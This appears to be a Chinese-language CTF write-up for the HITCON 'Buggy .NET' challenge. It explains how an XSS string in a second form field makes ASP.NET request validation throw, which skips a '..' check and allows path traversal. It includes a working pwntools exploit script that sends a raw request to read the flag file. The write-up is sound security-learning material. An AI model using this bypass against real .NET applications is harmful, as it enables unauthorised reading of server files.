# Buggy .NET

這題題目code很短

關鍵邏輯只有這幾行:

```csharp
bool isBad = false;
try {
    if ( Request.Form["filename"] != null ) {
        isBad = Request.Form["filename"].Contains("..") == true;
    }
} catch (Exception ex) {
    
} 

try {
    if (!isBad) {
        Response.Write(System.IO.File.ReadAllText(@"C:\inetpub\wwwroot\" + Request.Form["filename"]));
    }
} catch (Exception ex) {

}
```

flag 在 `C:\FLAG.txt`

所以我們的目標是想辦法往上跳去讀檔

一開始嘗試了很多招，也試過用短檔名去爆web目錄下的檔案

讀了web.config，也沒看到啥問題

嘗試各種windows路徑特性，也沒辦法繞過`..`判斷

```
[Work]
web~1.con
web.config/.
web.config\.
web.config%20
web.config.
...

[Not work]
web.config::$DATA
web.config%0a
...
```

後來想到，之前讀過某個國外.NET大佬的 WAF Bypass 簡報:

https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour

原本以為這個只能單純繞 Request Validation 去繞 WAF 做 XSS (30頁開始的部分)

但仔細一想，發現其實這題情境跟簡報裡的情境幾乎一模一樣

只要想辦法讓 `Request.Form["filename"].Contains("..")` 噴Exception，就能夠繞過判斷

最後嘗試很久簡報裡面的招，發現都不會Throw exception

花了點時間跟了 .NET Source Code，才發現原來簡報裡面噴 Exception 是因為 Request Validation 偵測到 XSS Attack

我以前一直以為是charset + POST/GET 互換造成的QQ

(具體函數呼叫鍊大概是: `Form.get` -> `ValidateHttpValueCollection` -> `collection.EnableGranularValidation` -> `ValidateString` -> `RequestValidator.Current.IsValidRequestString` -> `rossSiteScriptingValidation.IsDangerousString` -> `throw new HttpRequestValidationException`)

並且他做Validation只會做一次，所以後面再次取 `Request.Form["filename"]` 時，就不會再噴 Exception

```
public NameValueCollection Form {
    get {
        EnsureForm();

        if (_flags[needToValidateForm]) {
            _flags.Clear(needToValidateForm);
            ValidateHttpValueCollection(_form, RequestValidationSource.Form);
        }

        return _form;
    }
}
```


所以這邊我們只要簡單構造能觸發 Request Validation Exception 的 XSS Payload

就能繞掉 `Contains("..")` 判斷了

(所以其實也不需要 charset)

Exploit script:

```python
from pwn import *
import urllib

encoding = "utf-8"

r = remote("52.197.162.211", 80)

s = 'filename'
print(s)
res1 = (urllib.quote_plus(s.encode(encoding)))
l1 = len(res1)

#s = 'web.config'
s = '../../../../FLAG.txt'
print(s)
res2 = (urllib.quote_plus(s.encode(encoding)))
l2 = len(res2)

print(res1 + "=" + res2)
print("Length: ", l1 + l2 + 1)

s = "<script>alert(123)</script>"
shit = "&x=" + urllib.quote_plus(s.encode(encoding))

payload = '''GET / HTTP/1.1
Host: 52.197.162.211
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}'''.format(l1 + l2 + 1 + len(shit), res1 + "=" + res2 + shit).replace("\n", "\r\n")


r.send(payload)

r.interactive()
```

`hitcon{Amazing!!! @irsdl 1s ind33d the .Net KING!!!}`
